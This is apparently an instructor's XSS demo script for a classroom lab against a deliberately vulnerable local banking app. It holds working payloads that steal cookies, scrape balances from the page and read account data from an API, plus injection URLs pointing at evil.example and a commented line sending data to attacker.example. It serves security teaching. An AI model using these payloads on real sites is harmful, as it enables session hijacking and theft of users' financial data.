/**
 * inject.js — XSS Demo Payload
 * ─────────────────────────────────────────────────────────────────────────────
 * INSTRUCTOR NOTES
 *
 * This script simulates what an attacker would inject into the vulnerable
 * VaultLine app via the XSS vector in /search.
 *
 * There are THREE ways to trigger the XSS, ordered by realism:
 *
 *   METHOD A — URL-based (most realistic attack vector):
 *     Navigate to:
 *     http://localhost:3002/search?q=<script src="http://evil.example/payload.js"></script>
 *
 *     In the real world, this URL would be in a phishing email.
 *     The victim clicks it. The script runs in their session.
 *
 *   METHOD B — Search box (stored/reflected demo):
 *     1. Open http://localhost:3002
 *     2. Type into the search box:
 *        <img src=x onerror="alert('XSS: ' + document.cookie)">
 *     3. Hit Enter
 *     4. The img tag renders in the results page, onerror fires
 *
 *   METHOD C — Console paste (what we're doing in class):
 *     1. Open http://localhost:3002
 *     2. Open DevTools → Console
 *     3. Paste the IIFE below and hit Enter
 *     4. Watch it harvest session data and attempt the cross-origin API call
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * WHAT THIS SCRIPT DEMONSTRATES:
 *   1. Cookie theft — reading document.cookie from the victim's origin
 *   2. DOM scraping — reading rendered account balances from the page
 *   3. Cross-origin API exfiltration — using the victim's origin to fetch the
 *      API (only works when CORS_MODE=open on api-server.js)
 *   4. "Exfiltration" — logging the stolen data (in a real attack: POST to
 *      attacker server. We just console.log it.)
 * ─────────────────────────────────────────────────────────────────────────────
 */

(async function xssPayload() {

  console.group('%c⚠ XSS PAYLOAD EXECUTING', 'color: #e05252; font-size: 16px; font-weight: bold;');
  console.log('%cThis script is running in the context of: ' + window.location.origin,
    'color: #f5a623');

  // ── STEP 1: Cookie theft ─────────────────────────────────────────────────
  // document.cookie is accessible because the session cookie is NOT HttpOnly.
  // This is the combined failure: XSS + missing HttpOnly flag.

  const stolenCookie = document.cookie;
  console.log('%c[STEP 1] Cookie theft', 'color: #e05252; font-weight: bold;');
  console.log('  document.cookie =>', stolenCookie || '(empty — maybe HttpOnly was set?)');

  // ── STEP 2: DOM scraping ─────────────────────────────────────────────────
  // The attacker doesn't need to call the API if the data is already rendered.
  // This is why server-side rendering of sensitive data is dangerous under XSS.

  console.log('%c[STEP 2] DOM scraping', 'color: #e05252; font-weight: bold;');

  const cardAmounts = [...document.querySelectorAll('.card-amount')]
    .map(el => el.textContent.trim());

  if (cardAmounts.length) {
    console.log('  Balance cards found in DOM:');
    cardAmounts.forEach((amt, i) => console.log(`    Card ${i + 1}: ${amt}`));
  } else {
    console.log('  No balance cards found (search results page — navigate to / first)');
  }

  // ── STEP 3: Cross-origin API fetch ───────────────────────────────────────
  // This is where CORS becomes the story.
  //
  // This fetch comes from origin http://localhost:3002 (the victim app).
  // Whether the API server responds depends entirely on its CORS headers.
  //
  // CORS_MODE=none  → browser blocks the response (you'll see a CORS error)
  // CORS_MODE=open  → fetch succeeds — attacker reads your account data
  // CORS_MODE=strict → fetch succeeds from :3002, but if attacker is on
  //                    a different origin (e.g. :4000) they get blocked
  //
  // KEY INSIGHT: When XSS is present, "strict" CORS still lets the injected
  // script read the API — because the script runs IN localhost:3002's origin.
  // CORS doesn't protect against XSS. It protects against cross-origin scripts.

  console.log('%c[STEP 3] Cross-origin API fetch attempt', 'color: #e05252; font-weight: bold;');
  console.log('  Attempting: fetch("http://localhost:3003/api/accounts")');
  console.log('  This fetch originates from:', window.location.origin);

  try {
    const res = await fetch('http://localhost:3003/api/accounts');
    const data = await res.json();

    console.log('%c  ✅ FETCH SUCCEEDED — CORS allowed it', 'color: #e05252; font-weight: bold');
    console.log('  API returned account data:');
    console.table(data.accounts);
    console.log('  Total balance readable by attacker: $' + data.total_balance.toLocaleString());

    // Simulate "exfiltration" — in reality this would be:
    // fetch('https://attacker.example/collect', { method: 'POST', body: JSON.stringify(data) })
    console.log('%c  [EXFIL SIMULATED] In a real attack, this data just left your browser.',
      'color: #e05252; font-style: italic;');

  } catch (err) {
    console.log('%c  🚫 FETCH BLOCKED by browser', 'color: #4caf7d; font-weight: bold');
    console.log('  Error:', err.message);
    console.log('  → This means CORS_MODE=none (or strict from wrong origin)');
    console.log('  → Change to CORS_MODE=open on api-server.js to see the attack succeed');
  }

  // ── STEP 4: Illustrate the CORS-doesn't-fix-XSS point ───────────────────
  console.log('%c[STEP 4] CORS ≠ XSS protection', 'color: #f5a623; font-weight: bold;');
  console.log([
    '  Even with CORS_MODE=strict, this script can:',
    '  • Read document.cookie (already done above)',
    '  • Scrape all DOM content (already done above)',
    '  • Redirect the user:    window.location = "http://evil.example"',
    '  • Modify the page:      document.body.innerHTML = "<h1>Hacked</h1>"',
    '  • Log every keystroke:  document.addEventListener("keydown", ...)',
    '  CORS only controls cross-origin *network* access, not DOM access.',
    '  Once script runs in your origin, the DOM is fully exposed.',
  ].join('\n'));

  console.groupEnd();

})();
